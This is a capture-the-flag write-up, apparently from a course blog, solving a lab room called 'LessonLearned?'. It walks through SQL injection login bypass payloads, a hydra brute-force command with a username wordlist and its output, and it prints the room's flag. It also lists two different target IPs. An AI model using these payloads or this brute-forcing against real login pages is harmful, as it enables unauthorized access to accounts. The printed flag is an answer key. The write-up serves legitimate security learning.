---
Title: SWS101 LessonLearned?
categories: (SWS101,swsCTF)
tags: (SWS101,LessonLearned? )
---
# Topic: LessonLearned?
----

## Target Ip Address
    10.10.154.123

This room will give us lesson about what will happen when you try different sql injection command without knowing there consequences.

### Task 1 : Find the Flag

We already know that there are no rabbit holes, no hidden files, just a login page and a flag. So now we need to find that.

![loginpage](/assets/img/image33.png)

When we searched the target ip on the web we were directed to a login page.

First we used the "OR" sqlinjection but here we got a warning message.

    username: vdXNPUsW' OR '1'='1' -- -
    password: asdf

![oops](/assets/img/image36.png)

Lets use hydra for http-form bruteforce username.

```
hydra -L /home/kanisha13/SecLists/Usernames/xato-net-10-million-usernames.txt -p asdf 10.10.243.239 http-post-form "/:username=^USER^&password=^PASS^:Invalid username and password."

Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-13 11:45:02
[DATA] max 16 tasks per 1 server, overall 16 tasks, 8295455 login tries (l:8295455/p:1), ~518466 tries per task
[DATA] attacking http-post-form://10.10.243.239:80/:username=^USER^&password=^PASS^:Invalid username and password.

[80][http-post-form] host: 10.10.243.239   login: martin   password: asdf
[80][http-post-form] host: 10.10.243.239   login: patrick   password: asdf
[80][http-post-form] host: 10.10.243.239   login: stuart   password: asdf
[80][http-post-form] host: 10.10.243.239   login: marcus   password: asdf
[80][http-post-form] host: 10.10.243.239   login: kelly   password: asdf
[80][http-post-form] host: 10.10.243.239   login: arnold   password: asdf
[80][http-post-form] host: 10.10.243.239   login: Martin   password: asdf
[80][http-post-form] host: 10.10.243.239   login: karen   password: asdf
[80][http-post-form] host: 10.10.243.239   login: Patrick   password: asdf
```

Now we have a list of usernames.

We'll use a 'AND' sqlinjection which should give us the flag.

    username: martin' AND '1'='1' -- -
    password: asdf

![flagg](/assets/img/image35.png)

    Flag: THM{aab02c6b76bb752456a54c80c2d6fb1e}


